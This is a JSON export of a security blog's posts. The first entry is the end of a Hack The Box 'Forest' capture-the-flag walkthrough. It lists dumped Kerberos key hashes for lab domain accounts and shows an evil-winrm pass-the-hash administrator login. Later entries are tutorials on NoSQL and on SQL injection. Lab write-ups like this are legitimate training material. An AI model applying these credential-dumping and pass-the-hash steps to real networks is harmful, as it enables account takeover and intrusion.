htb.local\\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29 htb.local\\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7 htb.local\\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538 htb.local\\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702 htb.local\\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352 htb.local\\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d htb.local\\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701 htb.local\\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd htb.local\\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36 htb.local\\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb htb.local\\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c htb.local\\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3 htb.local\\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054 htb.local\\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161 htb.local\\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a htb.local\\sebastien:des-cbc-md5:702a3445e0d65b58 htb.local\\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5 htb.local\\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad htb.local\\lucinda:des-cbc-md5:a13bb56bd043a2ce htb.local\\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32 htb.local\\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea htb.local\\svc-alfresco:des-cbc-md5:014ac86d0b98294a htb.local\\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f htb.local\\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6 htb.local\\andy:des-cbc-md5:a2ab5eef017fb9da htb.local\\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6 htb.local\\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81 htb.local\\mark:des-cbc-md5:b5dff1f40b8f3be9 htb.local\\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427 htb.local\\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25 htb.local\\santi:des-cbc-md5:4075ad528ab9e5fd FOREST$:aes256-cts-hmac-sha1-96:7711cbb5ca057223c6f7ea9c86392d52020d6f274c2ed0233778b0f7c6e2fb42 FOREST$:aes128-cts-hmac-sha1-96:b155f92cca7761d7b6683ac144182318 FOREST$:des-cbc-md5:c8132fbf73c71fa8 EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6 EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e EXCH01$:des-cbc-md5:8c45f44c16975129 [*] Cleaning up... We got everything we can, \u0026ldquo;we\u0026rdquo; successfully acheived a hacker\u0026rsquo;s dream, Logged in using winrm as administrator and got the Root flag ❯ evil-winrm -u administrator -H 32693b\u0026lt;hidden\u0026gt; -i htb.local Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; type ../Desktop/root.txt \u0026lt;redacted\u0026gt; ","date":"7 March 2025","externalUrl":null,"permalink":"/posts/1741345035294-forest-writeuphtb/","section":"Posts","summary":"","title":"Forest Walkthrough(Hack The Box)","type":"posts"},{"content":"","date":"7 March 2025","externalUrl":null,"permalink":"/tags/info/","section":"Tags","summary":"","title":"Info","type":"tags"},{"content":"","date":"7 March 2025","externalUrl":null,"permalink":"/categories/information/","section":"Categories","summary":"","title":"Information","type":"categories"},{"content":" A non-relational database does not use tables, rows, columns, primary keys, relationships, or schemas. Instead, a NoSQL database stores data using various storage models, depending on the type of data stored.\nDue to the lack of a defined structure for the database, NoSQL databases are very scalable and flexible. When dealing with datasets that are not very well defined and structured, a NoSQL database would be the best choice for storing our data.\nThere are 4 common storage models for NoSQL databases:\nKey-Value Document-Based Wide-Column Graph Each of the above models has a different way of storing data. For example, the Key-Value model usually stores data in JSON or XML, and has a key for each pair, storing all of its data as its value:\ngraph LR subgraph Posts box1[id\ndate\ncontent] box2[id\ndate\ncontent] box3[id\ndate\ncontent] end box1 --\u003e Key1[Key] box1 --\u003e Value1[Value] box2 --\u003e Key2[Key] box2 --\u003e Value2[Value] box3 --\u003e Key3[Key] box3 --\u003e Value3[Value] The above example can be represented using JSON as follows: { \u0026#34;100001\u0026#34;: { \u0026#34;date\u0026#34;: \u0026#34;01-01-2021\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Welcome to this web application.\u0026#34; }, \u0026#34;100002\u0026#34;: { \u0026#34;date\u0026#34;: \u0026#34;02-01-2021\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;This is the first post on this web app.\u0026#34; }, \u0026#34;100003\u0026#34;: { \u0026#34;date\u0026#34;: \u0026#34;02-01-2021\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Reminder: Tomorrow is the ...\u0026#34; } } It looks similar to a dictionary/map/key-value pair in languages like Python or PHP \u0026lsquo;i.e. {'key':'value'}\u0026rsquo;, where the key is usually a string, the value can be a string, dictionary, or any class object.\nThe Document-Based model stores data in complex JSON objects and each object has certain meta-data while storing the rest of the data similarly to the Key-Value model.\nSome of the most common NoSQL databases include:\nType Description MongoDB The most common NoSQL database. It is free and open-source, uses the Document-Based model, and stores data in JSON objects ElasticSearch Another free and open-source NoSQL database. It is optimized for storing and analyzing huge datasets. As its name suggests, searching for data within this database is very fast and efficient Apache Cassandra Also free and open-source. It is very scalable and is optimized for gracefully handling faulty values Other common NoSQL databases include: Redis, Neo4j, CouchDB, and Amazon DynamoDB. ","date":"7 March 2025","externalUrl":null,"permalink":"/posts/1741344317221-non-relational-nosql/","section":"Posts","summary":"","title":"Non-relational (NoSQL)","type":"posts"},{"content":"","date":"7 March 2025","externalUrl":null,"permalink":"/tags/server/","section":"Tags","summary":"","title":"Server","type":"tags"},{"content":" Very common vulnerability in web applications is a SQL Injection vulnerability. Similarly to a Command Injection vulnerability, this vulnerability may occur when the web application executes a SQL query, including a value taken from user-supplied input.\nFor example, in the database section, we saw an example of how a web application would use user-input to search within a certain table, with the following line of code:\n$query = \u0026#34;select * from users where name like \u0026#39;%$searchInput%\u0026#39;\u0026#34;; If the user input is not properly filtered and validated (as is the case with Command Injections), we may execute another SQL query alongside this query, which may eventually allow us to take control over the database and its hosting server.\nFor example, the same previous College Management System 1.2 suffers from a SQL injection vulnerability, in which we can execute another SQL query that always returns true, meaning we successfully authenticated, which allows us to log in to the application. We can use the same vulnerability to retrieve data from the database or even gain control over the hosting server.\n","date":"7 March 2025","externalUrl":null,"permalink":"/posts/1741343014156-sql-injection/","section":"Posts","summary":"","title":"SQl-Injection","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]